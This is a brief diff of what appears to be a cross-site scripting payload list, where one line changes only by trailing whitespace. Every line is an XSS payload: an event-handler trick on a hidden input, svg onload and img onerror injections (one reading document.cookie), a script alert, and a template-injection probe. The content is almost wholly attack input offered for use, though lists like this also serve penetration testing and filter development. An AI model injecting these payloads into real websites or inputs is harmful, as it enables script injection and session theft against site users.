@@ -1,5 +1,5 @@
 "><input type="hidden" oncontentvisibilityautostatechange="confirm(/LazyXss/)" style="content-visibility:auto">
-'"><svg/onload=prompt(7);>{{7*7}}
+'"><svg/onload=prompt(7);>{{7*7}} 
 "><svg%2Fclass%3D"d3rk"onLoad%3Dalert(/d3rk/)>
 '><img src=x onerror=prompt(document.cookie)>
 <script language=JavaScript>alert('XSS')</script>
